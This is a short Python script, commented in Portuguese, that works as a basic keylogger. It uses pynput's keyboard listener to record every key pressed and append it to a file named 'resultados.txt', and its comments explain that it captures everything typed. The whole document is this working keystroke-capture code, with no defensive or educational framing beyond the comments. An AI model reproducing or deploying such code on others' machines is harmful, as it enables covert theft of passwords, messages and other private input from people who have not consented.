from pynput.keyboard import Listener

def log(teclado):
    with open("resultados.txt","a") as arquivo_log: ##essa parte adiciona o q captura ao txt
        arquivo_log.write(str(teclado))##sem str ele apresenta erro pq n entende q é pra escrever

with Listener(on_press=log) as monitor: ##essa parte q capturas tudo que é escrito
    monitor.join()
